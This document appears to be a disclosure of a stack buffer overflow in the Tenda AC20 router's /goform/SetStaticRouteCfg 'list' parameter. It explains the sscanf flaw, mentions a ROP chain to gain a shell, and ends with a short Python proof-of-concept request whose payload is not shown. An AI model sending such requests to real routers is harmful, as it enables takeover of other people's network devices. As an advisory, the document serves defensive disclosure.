## Basic Information

Vulnerability manufacturer: Shenzhen Jixiang Tenda Technology Co., Ltd.

Vulnerability level: high risk

Manufacturer's official website: https://www.tenda.com.cn

Affected object type: network equipment

Affected product: Tenda AC20

Affected product version: AC20_V16.03.08.05

Is it a product component vulnerability: No

## 1. Vulnerability Overview

Tenda AC20 is a wireless router from China's Tenda company.

Tenda AC20 has a buffer overflow vulnerability. The vulnerability is caused by the parameter list in the file /goform/SetStaticRouteCfg failing to correctly verify the length of the input data. Attackers can exploit this vulnerability to execute arbitrary code on the system.

## 2. Vulnerability Details

ida analyzes the binary file /bin/httpd, and WebVar obtains the list parameter and passes it to save_staticroute_data

There is a stack overflow in sscanf, which directly reads our parameters without restriction. Here we can control the return address of the program, successfully use the rop chain getshell, and pass in a large number of bytes at the same time, which can cause the program to crash.

url = "http://192.168.87.135/goform/SetStaticRouteCfg"


params = {"list": payload}
response = requests.get(url, params=params)
response = requests.get(url, params=params)
print(response.text)
